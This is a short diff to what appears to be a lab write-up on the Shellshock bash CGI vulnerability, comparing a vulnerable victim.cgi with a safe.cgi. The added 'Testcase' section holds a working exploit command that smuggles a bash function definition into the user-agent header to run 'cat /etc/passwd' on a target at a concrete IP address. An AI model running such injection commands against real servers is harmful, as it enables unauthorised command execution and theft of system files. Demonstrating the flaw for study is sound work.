@@ -23,3 +23,10 @@ We can send include our payload in the user-agent string when visiting victim.cg
 The same request sent to safe.cgi is unaffected:
 
 ![](2.png)
+
+## Testcase
+
+
+```
+docker run --rm curlimages/curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://207.180.241.66:60001/victim.cgi
+```
